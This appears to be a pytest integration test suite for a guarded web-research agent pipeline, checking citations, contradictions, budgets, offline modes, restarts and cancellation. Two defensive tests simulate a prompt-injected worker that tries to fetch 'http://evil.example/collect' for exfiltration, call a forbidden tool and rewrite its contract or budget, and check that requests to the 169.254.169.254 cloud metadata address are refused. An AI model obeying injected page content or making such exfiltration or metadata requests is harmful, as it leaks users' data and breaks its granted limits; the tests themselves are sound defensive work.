"""Stage 11 integration tests through the REAL Stage 01A controller (PostgreSQL, Focus-4, numbered tool pools, drift
guard, policy, execution gateway, supervised isolated handlers) against deterministic local HTTP fixtures.

Claims are supplied by ExplicitClaims (a labelled TEST FIXTURE, builder='explicit-test') because no model exists
before Stage 03; nothing here is presented as model output."""
from __future__ import annotations

import threading
import time

import pytest

from backend.research.claims import ExplicitClaims
from backend.research.contracts import NetworkMode
from backend.research.errors import ResearchError, ResearchErrorCode
from conftest import requires_db, recent_iso
from harness import build, record

pytestmark = requires_db

Q = "When did the Rivertown bridge reopen and what did the repairs cost?"
SUBS = ["Rivertown bridge reopen date", "Rivertown bridge repair cost"]


def sid_for(packet, suffix):
    return next(s["source_id"] for s in packet["sources"] if (s["canonical_url"] or "").endswith(suffix) and not s["duplicate_of"])


def bridge_claims(packet):
    a, c = sid_for(packet, "/page/a.html"), sid_for(packet, "/page/c.html")
    return [
        {"text": "The Rivertown bridge reopened on Monday after eight months of repairs.", "subquestion_index": 0,
         "support": [{"source_id": a, "quote": "The Rivertown bridge reopened on Monday after eight months"}]},
        {"text": "The repairs cost 12 million euros.", "subquestion_index": 1, "subject": "Rivertown bridge repairs",
         "attribute": "cost", "value": "12 million euros",
         "support": [{"source_id": a, "quote": "The repairs cost 12 million euros"}]},
        {"text": "The repairs cost 15 million euros.", "subquestion_index": 1, "subject": "Rivertown bridge repairs",
         "attribute": "cost", "value": "15 million euros",
         "support": [{"source_id": c, "quote": "repairs cost 15 million euros, not 12 million"}]},
    ]


def run(h, *args, claims=None, **kw):
    c = h.service.create(*args, **kw)
    h.approve(c.research_id)
    r = h.service.run(c.research_id, claim_builder=ExplicitClaims(claims) if claims else None)
    return c, r


# ------------------------------------------------------------------------------------------------ main pipeline
def test_standard_research_end_to_end_with_citations_contradictions_and_syndication(h, fx):
    c, r = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, claims=bridge_claims)
    rid = c.research_id
    assert r["research_status"] == "COMPLETED_WITH_LIMITATIONS", r["limitations"]
    assert r["verification_status"] == "VERIFIED" and r["verification"]["passed"]
    assert len(r["claims"]) == 3 and len(r["citations"]) == 3
    assert all(x["verified"] for x in h.store.citations(rid))
    # syndicated copy recorded but not counted as independent corroboration
    srcs = h.store.sources(rid)
    b = next(s for s in srcs if s["canonical_url"].endswith("/page/b.html"))
    a = next(s for s in srcs if s["canonical_url"].endswith("/page/a.html"))
    assert b["duplicate_of"] == a["source_id"] and b["independence_group"] == a["independence_group"]
    assert r["summary"]["sources"]["duplicates"] >= 1
    # the cost disagreement is exposed, not silently resolved
    cons = h.store.contradictions(rid)
    assert len(cons) == 1 and cons[0]["status"] == "unresolved" and "12 million" in cons[0]["detail"]
    assert set(cons[0]["supporting_source_ids"] + cons[0]["contradicting_source_ids"]) == {
        a["source_id"], next(s["source_id"] for s in srcs if s["canonical_url"].endswith("/page/c.html"))}
    assert cons[0]["date_differences"]
    assert any(l["code"] == "UNRESOLVED_CONTRADICTION" for l in r["limitations"])
    assert any(l["code"] == "BLOCKED_DEPENDENCY" and l.get("dependency") == "S03" for l in r["limitations"])
    assert r["synthesis"]["status"] == "BLOCKED"            # no model synthesis is claimed
    # claim/source binding is queryable
    links = h.store.claim_sources(rid)
    assert {(l["relation"]) for l in links} == {"supports"} and len(links) == 3
    # every executable step went through the Stage 01A gateway with a numbered pool of <= 4 tools
    oid = c.objective_id
    for t in h.controller.store.tasks(oid):
        pool = h.controller.store.contract(oid, t["task_id"]).permitted_tool_ids
        assert 1 <= len(pool) <= 4 and all(p.startswith(("011.", "012.")) for p in pool)
    assert all(e["policy"]["decision"] == "allow" for e in h.controller.store.executions(oid))
    # audit chain objective -> query -> source -> evidence -> claim -> citation -> result
    tr = h.service.trace(rid)
    assert tr["objective_id"] == oid and tr["result"]
    assert all(q["execution_id"] for q in tr["queries"]) and all(s["execution_id"] for s in tr["sources"])
    assert all(cit["evidence_id"] and cit["verified"] for cit in tr["citations"])
    record("S11-PIPELINE-STANDARD", {"result": r, "trace": tr})


def test_invalid_citations_are_rejected(h, fx):
    other_c, _ = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, claims=bridge_claims)
    foreign_ev = h.store.evidence_for(other_c.research_id)[0]["evidence_id"]

    def bad(packet):
        a = sid_for(packet, "/page/a.html")
        return [
            {"text": "Invented citation id", "support": [{"evidence_id": "cit_01ZZZZZZZZZZZZZZZZZZZZZZZZ"}]},
            {"text": "Evidence of another research", "support": [{"evidence_id": foreign_ev}]},
            {"text": "Quote not in the source", "support": [{"source_id": a, "quote": "the bridge was painted pink"}]},
            {"text": "Unknown source", "support": [{"source_id": "src_01ZZZZZZZZZZZZZZZZZZZZZZZZ",
                                                    "quote": "The repairs cost 12 million euros"}]},
            {"text": "Extra fields", "support": [{"source_id": a, "quote": "x" * 10, "citation_id": "cit_mine"}]},
            {"text": "A real, cited claim about the reopening.",
             "support": [{"source_id": a, "quote": "The Rivertown bridge reopened on Monday"}]},
        ]
    c, r = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, claims=bad)
    rej = next(l for l in r["limitations"] if l["code"] == "VERIFICATION_FAILED")
    assert len(rej["rejected"]) == 5
    assert len(r["claims"]) == 1 and r["citations"][0]["citation_id"].startswith("cit_")
    assert r["verification_status"] == "VERIFIED"


def test_uncited_material_claim_fails_verification(h, fx):
    c, r = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS,
               claims=[{"text": "The bridge is the longest in the region.", "material": True, "support": []}])
    assert r["research_status"] == "FAILED" and r["verification_status"] == "VERIFICATION_FAILED"
    assert r["verification"]["uncited_material_claims"] and r["error"]["code"] == "VERIFICATION_FAILED"


def test_tampered_evidence_detected_by_independent_verifier(h, fx):
    c, r = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, claims=bridge_claims)
    from backend.research.verification import ResearchVerifier
    cited = h.store.source(h.store.citations(c.research_id)[0]["source_id"])
    snap = h.store.snapshot(cited["snapshot_id"])
    ws = h.controller.gateway.workspace(c.objective_id)
    (ws / snap["raw_path"]).write_bytes(b"tampered")
    rep = ResearchVerifier(h.store, ws).verify(h.store.contract(c.research_id))
    assert not rep["passed"] and any("raw snapshot bytes" in p for x in rep["citations"] for p in x["problems"])
    import psycopg
    with pytest.raises(psycopg.Error):        # stored evidence is append-only in the database
        with h.store.db.tx() as x:
            x.execute("UPDATE research.snapshots SET text = 'x' WHERE snapshot_id = %s", (snap["snapshot_id"],))


# ------------------------------------------------------------------------------------------------ modes
def test_quick_search_is_bounded_and_returns_ranked_results(h, fx):
    c, r = run(h, "Rivertown bridge", "QUICK_SEARCH")
    assert r["research_status"] in ("COMPLETED", "COMPLETED_WITH_LIMITATIONS")
    assert r["verification_status"] == "VERIFIED"
    results = [f for f in r["findings"] if f["type"] == "search_result"]
    assert results and results[0]["rank"] == 1 and all(f["url"] for f in results)
    b = h.store.budgets(c.research_id)
    assert b["queries"]["consumed"] <= 2 and b["fetches"]["consumed"] <= 3
    assert len(h.controller.store.tasks(c.objective_id)) <= 5


def test_fact_verification_and_source_comparison_modes(h, fx):
    c, r = run(h, "Did the bridge repairs cost 12 million euros?", "FACT_VERIFICATION",
               claims_to_verify=["Rivertown bridge repairs cost 12 million euros"], claims=bridge_claims)
    assert r["verification_status"] == "VERIFIED" and len(h.store.contradictions(c.research_id)) == 1
    c2, r2 = run(h, "Compare the two bridge reports", "SOURCE_COMPARISON",
                 source_requirements={"seed_urls": [f"{fx.base}/page/a.html", f"{fx.base}/page/c.html"]},
                 claims=lambda p: [{"text": "Reports disagree on cost.", "support": [
                     {"source_id": sid_for(p, "/page/c.html"), "quote": "repairs cost 15 million euros"}]}])
    assert h.store.queries(c2.research_id) == []                     # no search in comparison mode
    cmp = r2["summary"]["comparisons"]
    assert cmp and cmp[0]["pairs"] and "jaccard" in cmp[0]["pairs"][0]


# ------------------------------------------------------------------------------------------------ providers / offline
def test_provider_unavailable_never_fabricates(tmp_path, fx):
    h = build(tmp_path, port=fx.port, providers=[])
    c, r = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, claims=bridge_claims)
    assert r["research_status"] == "BLOCKED" and r["error"]["code"] == "PROVIDER_UNAVAILABLE"
    assert h.store.queries(c.research_id) == [] and h.store.sources(c.research_id) == []
    assert not any(p.startswith("/searx") for p in fx.hits)


def test_broken_provider_and_credentialed_provider(tmp_path, fx):
    h = build(tmp_path, port=fx.port, providers=[
        {"id": "broken", "kind": "searxng", "endpoint": f"http://127.0.0.1:{fx.port}/searx-broken"}])
    c, r = run(h, "Rivertown bridge", "QUICK_SEARCH")
    q = h.store.queries(c.research_id)
    assert q and q[0]["status"] == "failed" and q[0]["error_code"] == "PROVIDER_UNAVAILABLE" and q[0]["results"] == []
    assert r["research_status"] == "BLOCKED"
    h2 = build(tmp_path, port=fx.port, providers=[{"id": "brave", "kind": "brave",
                                                    "endpoint": f"http://127.0.0.1:{fx.port}/brave",
                                                    "credential_ref": "cred://stage02/search/brave"}])
    c2, r2 = run(h2, "Rivertown bridge", "QUICK_SEARCH")
    assert h2.store.queries(c2.research_id)[0]["error_code"] == "BLOCKED_DEPENDENCY"


@pytest.mark.parametrize("mode", [NetworkMode.AIR_GAPPED, NetworkMode.OFFLINE])
def test_offline_mode_external_unavailable_local_research_works(tmp_path, fx, mode):
    h = build(tmp_path, port=fx.port, mode=mode)
    c, r = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, claims=bridge_claims)
    assert r["research_status"] == "BLOCKED" and r["error"]["code"] == "OFFLINE_UNAVAILABLE"
    assert h.controller.store.tasks(c.objective_id) == [] and not fx.hits       # no network attempted at all
    local = h.service.create("What does the project note say about the bridge?", "STANDARD_RESEARCH",
                             source_requirements={"local_sources": ["sources/local/bridge-note.md"]})
    h.service.attach_local_source(local.research_id, "sources/local/bridge-note.md",
                                  b"# Bridge note\n\nThe Rivertown bridge carries about 20000 vehicles per day.\n")
    with pytest.raises(ResearchError):
        h.service.attach_local_source(local.research_id, "sources/local/other.md", b"x")   # not authorised
    h.approve(local.research_id)
    r2 = h.service.run(local.research_id, claim_builder=ExplicitClaims(lambda p: [{
        "text": "The bridge carries about 20000 vehicles per day.",
        "support": [{"source_id": p["sources"][0]["source_id"], "quote": "about 20000 vehicles per day"}]}]))
    assert r2["verification_status"] == "VERIFIED" and r2["research_status"] == "COMPLETED_WITH_LIMITATIONS"
    assert any(l["code"] == "OFFLINE_UNAVAILABLE" for l in r2["limitations"])
    assert not fx.hits
    record(f"S11-OFFLINE-{mode.value}", {"web": r["error"], "local": r2["research_status"]})


# ------------------------------------------------------------------------------------------------ budgets / depth
def test_query_budget_enforced(h, fx):
    c, r = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS + ["third subquestion bridge"],
               budget={"max_queries": 1}, claims=bridge_claims)
    assert len(h.store.queries(c.research_id)) == 1
    assert h.store.budgets(c.research_id)["queries"] == {"limit": 1.0, "consumed": 1.0, "remaining": 0.0}
    assert any(l["code"] == "BUDGET_EXHAUSTED" and "queries" in l["metrics"] for l in r["limitations"])


def test_source_and_fetch_budgets_enforced(h, fx):
    one = lambda p: [{"text": "A cited claim.", "support": [{"source_id": p["sources"][0]["source_id"],
                                                              "quote": "Rivertown bridge"}]}]  # noqa: E731
    c, r = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, budget={"max_sources": 1}, claims=one)
    assert len(h.store.sources(c.research_id)) == 1
    assert any(l["code"] == "BUDGET_EXHAUSTED" and "sources" in l["metrics"] for l in r["limitations"])
    c2, r2 = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, budget={"max_fetches": 2}, claims=one)
    fetches = [d for d in (e["detail"] for e in h.store.events(c2.research_id, ("task.planned",)))
               if d["kind"] == "retrieve"]
    assert len(fetches) == 2 and h.store.budgets(c2.research_id)["fetches"]["consumed"] == 2


def test_budget_ceiling_and_db_guards(h, fx):
    with pytest.raises(ResearchError) as e:
        h.service.create(Q, "QUICK_SEARCH", budget={"max_queries": 50})
    assert e.value.code is ResearchErrorCode.BUDGET_EXHAUSTED
    c = h.service.create(Q, "QUICK_SEARCH")
    import psycopg
    with pytest.raises(psycopg.Error):
        with h.store.db.tx() as x:
            x.execute("UPDATE research.budgets SET limit_value = 999 WHERE research_id = %s", (c.research_id,))
    assert h.store.consume(c.research_id, "queries", 2) and not h.store.consume(c.research_id, "queries", 1)


def test_link_depth_limit(h, fx):
    c, r = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, follow_links=True, budget={"max_depth": 1},
               claims=bridge_claims)
    srcs = h.store.sources(c.research_id)
    council = [s for s in srcs if s["canonical_url"].endswith("/page/council.html")]
    assert council and council[0]["depth"] == 1 and max(s["depth"] for s in srcs) == 1
    c0, _ = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, follow_links=True, budget={"max_depth": 0},
                claims=bridge_claims)
    assert max(s["depth"] for s in h.store.sources(c0.research_id)) == 0


def test_deep_research_uses_focus4_bounded_batches(h, fx):
    subs = [f"Rivertown bridge aspect {i}" for i in range(7)]
    observed = []
    orig = h.controller.release

    def watch(oid):
        out = orig(oid)
        observed.append(h.controller.store.active_count(oid))
        return out
    h.controller.release = watch
    c, r = run(h, Q, "DEEP_RESEARCH", subquestions=subs, claims=bridge_claims)
    assert observed and max(observed) <= 4
    planned = h.store.events(c.research_id, ("task.planned",))
    assert len(planned) > 4                                               # more work than one Focus-4 batch
    assert h.store.latest_checkpoint(c.research_id)["sequence"] >= 3      # several bounded batches, checkpointed
    assert r["verification_status"] == "VERIFIED"
    with pytest.raises(Exception):
        h.service.create(Q, "DEEP_RESEARCH", subquestions=[f"s{i}" for i in range(13)])   # > max_subquestions


# ------------------------------------------------------------------------------------------------ untrusted content
def test_prompt_injection_cannot_alter_contract_tools_or_budgets(h, fx):
    c = h.service.create("Bridge injection FAQ", "STANDARD_RESEARCH")
    h.approve(c.research_id)
    before = (h.store.contract(c.research_id).hash(), h.store.budgets(c.research_id))
    r = h.service.run(c.research_id, claim_builder=ExplicitClaims(lambda p: [{
        "text": "The bridge is a steel arch bridge built in 1964.",
        "support": [{"source_id": sid_for(p, "/page/inject.html"), "quote": "steel arch bridge built in 1964"}]}]))
    after = h.store.contract(c.research_id)
    assert after.hash() == before[0] and after.contract_version == 1
    assert {k: v["limit"] for k, v in h.store.budgets(c.research_id).items()} == \
        {k: v["limit"] for k, v in before[1].items()}
    oid = c.objective_id
    for t in h.controller.store.tasks(oid):
        con = h.controller.store.contract(oid, t["task_id"])
        assert con.contract_version == 1 and "019.001" not in con.permitted_tool_ids
    assert all(e["tool_number"].startswith(("011.", "012.")) for e in h.controller.store.executions(oid))
    assert not any("evil.example" in p for p in fx.hits)
    assert r["verification_status"] == "VERIFIED"
    assert not [d for d in h.policy.audit_log() if d.operation == "policy.grant"]


def test_compromised_worker_obeying_injected_content_is_contained(h, fx):
    """Simulate a worker that DOES follow the page's instructions: the gateway refuses every forbidden step."""
    from backend.orchestration.contracts import ToolProposal
    c = h.service.create("Bridge injection FAQ", "QUICK_SEARCH")
    h.approve(c.research_id)
    oid = c.objective_id
    # a retrieve task for the injection page, driven by hand as a compromised worker would
    tid = "TASK-0900"
    from backend.orchestration.controller import TaskSpec
    h.controller.plan(oid, [TaskSpec(task_id=tid, requirement_ids=["FR-01"], task_type="research.retrieve",
                                     description="retrieve injection page", required_outcome="stored",
                                     operations=["fetch", "extract", "find"], permitted_filesystem_paths=["research"],
                                     permitted_network_destinations=["127.0.0.1"],
                                     acceptance_criteria=[{"id": "TC-01", "description": "ran", "requirement_ids":
                                                           ["FR-01"], "verifier": "execution_succeeded"}])])
    released = h.controller.release(oid)
    assert tid in released
    t = h.controller.store.transition(oid, tid, "RUNNING", "test", h.controller.controller_id, expect=["QUEUED"])
    con = h.controller.store.contract(oid, tid)
    ctx = h.controller.gateway.issue_context(oid, tid, t["attempt_id"], con.contract_hash, con.assigned_worker)

    def P(tool, op, args, targets=()):
        import uuid
        return ToolProposal(proposal_id=f"inj-{uuid.uuid4().hex[:8]}", task_id=tid, contract_version=1, tool_id=tool,
                            operation=op, arguments=args, target_resources=list(targets), expected_result="x",
                            referenced_requirement_ids=["FR-01"])
    ok = h.controller.gateway.execute(ctx, P("011.002", "fetch", {"url": f"{fx.base}/page/inject.html"}))
    assert ok.status == "executed" and ok.output["ok"]
    attempts = [P("019.001", "run", {}),                                                  # tool the page asked for
                P("011.002", "fetch", {"url": "http://evil.example/collect"}),           # exfiltration destination
                P("011.002", "fetch", {"url": f"{fx.base}/page/a.html"}, ["budget:max_queries"]),   # raise budget
                P("011.002", "fetch", {"url": f"{fx.base}/x"}, ["contract:TASK-0900"]),  # rewrite contract
                P("011.001", "search", {"provider_kind": "searxng", "endpoint": fx.base, "query": "x"})]  # not in pool
    rules = [[v.rule for v in h.controller.gateway.execute(ctx, p).violations] for p in attempts]
    assert rules[0] in (["unknown_tool"], ["tool_not_in_pool"]) and rules[1] == ["network_not_permitted"]
    assert "protected_controller_state" in rules[2] and "protected_controller_state" in rules[3]
    assert rules[4] == ["tool_not_in_pool"]
    assert h.controller.store.contract(oid, tid).contract_hash == con.contract_hash
    record("S11-INJECTION-CONTAINED", {"rules": rules})


def test_unsafe_search_results_refused_before_and_during_retrieval(h, fx):
    c, r = run(h, "unsafe bridge results", "QUICK_SEARCH")
    refused = [e["detail"] for e in h.store.events(c.research_id, ("source.refused",))]
    assert any("169.254.169.254" in x["url"] for x in refused)
    q = h.store.queries(c.research_id)[0]
    assert not any(r_["url"].startswith("file:") for r_ in q["results"])   # dropped by the provider adapter
    redirected = [s for s in h.store.sources(c.research_id) if "redirect-metadata" in (s["original_url"] or "")]
    assert redirected and redirected[0]["error_code"] == "NETWORK_DENIED"
    assert not any("latest/meta-data" in p for p in fx.hits)


# ------------------------------------------------------------------------------------------------ freshness
def test_freshness_requirement_not_silently_satisfied(h, fx):
    c, r = run(h, "stale bridge news", "STANDARD_RESEARCH", required_freshness={"requires_current": True,
                                                                               "max_age_days": 30},
               claims=lambda p: [{"text": "The bridge would close for repairs.", "support": [
                   {"source_id": sid_for(p, "/page/old.html"), "quote": "will close for repairs"}]}])
    assert any(l["code"] == "FRESHNESS_NOT_MET" for l in r["limitations"])
    assert r["verification"]["freshness"]["met"] is False and r["research_status"] != "COMPLETED"
    c2, r2 = run(h, Q, "STANDARD_RESEARCH", subquestions=SUBS, required_freshness={"requires_current": True,
                                                                                  "max_age_days": 30},
                 claims=bridge_claims)
    assert r2["verification"]["freshness"]["met"] is True
    assert not any(l["code"] == "FRESHNESS_NOT_MET" for l in r2["limitations"])


# ------------------------------------------------------------------------------------------------ versioning
def test_contract_changes_are_versioned_and_authorised(h, fx):
    c = h.service.create(Q, "STANDARD_RESEARCH", subquestions=SUBS)
    from backend.orchestration.authorization import AuthorizationError
    with pytest.raises(AuthorizationError):
        h.service.amend(c.research_id, {"scope": "Europe"}, "narrow", None)
    from backend.contracts import canonical_hash
    changes = {"execution_budget": c.execution_budget.model_dump() | {"max_queries": 3}}
    v2 = h.service.amend(c.research_id, changes, "lower queries",
                         h.auth("amend_research", c.research_id, canonical_hash({"base": c.hash(), "changes": changes})))
    assert v2.contract_version == 2 and v2.maximum_queries == 3 and v2.hash() != c.hash()
    assert h.store.budgets(c.research_id)["queries"]["limit"] == 3
    assert [v["version"] for v in h.store.contract_versions(c.research_id)] == [1, 2]
    with pytest.raises(ResearchError):
        h.service.amend(c.research_id, {"question": "something else"}, "x", None)
    raise_ = {"execution_budget": v2.execution_budget.model_dump() | {"max_queries": 6}}
    with pytest.raises(ResearchError):
        h.service.amend(c.research_id, raise_, "raise", h.auth("amend_research", c.research_id,
                        canonical_hash({"base": v2.hash(), "changes": raise_})))


def test_unapproved_research_does_not_execute(h, fx):
    c = h.service.create(Q, "QUICK_SEARCH")
    with pytest.raises(ResearchError) as e:
        h.service.run(c.research_id)
    assert e.value.code is ResearchErrorCode.BLOCKED_DEPENDENCY and not fx.hits


# ------------------------------------------------------------------------------------------------ checkpoint / restart
def test_checkpoint_and_restart_recovery(h, fx, tmp_path):
    c = h.service.create(Q, "STANDARD_RESEARCH", subquestions=SUBS)
    h.approve(c.research_id)
    paused = h.service.run(c.research_id, max_batches_this_call=1)
    assert paused["status"] == "PAUSED"
    cp = h.store.latest_checkpoint(c.research_id)
    for key in ("completed_subquestions", "queries_executed", "sources_collected", "claims", "contradictions",
                "evidence_gaps", "budgets", "pending_tasks"):
        assert key in cp["data"]
    # simulate a crash in the middle of the next batch: a task left RUNNING by a dead controller
    svc = h.service
    rc = h.store.contract(c.research_id)
    svc._plan_next(c.research_id, rc)
    oid = c.objective_id
    released = h.controller.release(oid)
    assert released
    h.controller.store.transition(oid, released[0], "RUNNING", "worker started (then the process died)",
                                  h.controller.controller_id, expect=["QUEUED"])
    # restart: a NEW controller + service over the same database, files and namespace
    h2 = build(tmp_path, port=fx.port, reuse=h)
    assert h2.controller.controller_id != h.controller.controller_id
    r = h2.service.resume(c.research_id, claim_builder=ExplicitClaims(bridge_claims))
    assert r["verification_status"] == "VERIFIED", r
    page_hits = [p for p in fx.hits if p.startswith("/page/")]
    assert len(page_hits) == len(set(page_hits)), "a source stored before the restart was fetched again"
    assert any(e["kind"] == "resume" for e in h2.store.events(c.research_id))
    record("S11-RESTART-RECOVERY", {"checkpoint": cp["data"], "final": r["research_status"]})


# ------------------------------------------------------------------------------------------------ cancellation
def test_cancellation_stops_work_keeps_evidence_never_completed(h, fx):
    c = h.service.create("slow bridge sources and Rivertown bridge", "STANDARD_RESEARCH",
                         subquestions=["Rivertown bridge reopen date", "slow bridge source"])
    h.approve(c.research_id)
    out = {}
    th = threading.Thread(target=lambda: out.update(r=h.service.run(c.research_id,
                                                                     claim_builder=ExplicitClaims(bridge_claims))))
    th.start()
    deadline = time.time() + 60
    while time.time() < deadline and not any(p.startswith("/slow") for p in fx.hits):
        time.sleep(0.2)
    assert any(p.startswith("/slow") for p in fx.hits), "slow source never requested"
    stored_before = len([s for s in h.store.sources(c.research_id) if s["extraction_status"] == "extracted"])
    t0 = time.time()
    h.service.cancel(c.research_id, "user stopped it")
    th.join(60)
    assert not th.is_alive() and time.time() - t0 < 30, "cancellation did not stop the running fetch promptly"
    r = out["r"]
    assert r["research_status"] == "CANCELLED" and r["error"]["code"] == "CANCELLED"
    assert h.store.run(c.research_id)["status"] == "CANCELLED"
    assert len([s for s in h.store.sources(c.research_id) if s["extraction_status"] == "extracted"]) >= stored_before
    assert r["limitations"][0]["unfinished"]
    execs = h.controller.store.executions(c.objective_id)
    assert any(e["state"] == "cancelled" for e in execs)
    import psycopg
    with pytest.raises(psycopg.Error):
        with h.store.db.tx() as x:
            x.execute("UPDATE research.runs SET status = 'COMPLETED' WHERE research_id = %s", (c.research_id,))
    n_planned = len(h.store.events(c.research_id, ("task.planned",)))
    h.service.run(c.research_id)                                     # cancelled research never restarts silently
    assert len(h.store.events(c.research_id, ("task.planned",))) == n_planned
    record("S11-CANCELLATION", {"result_status": r["research_status"], "unfinished": r["limitations"][0]})
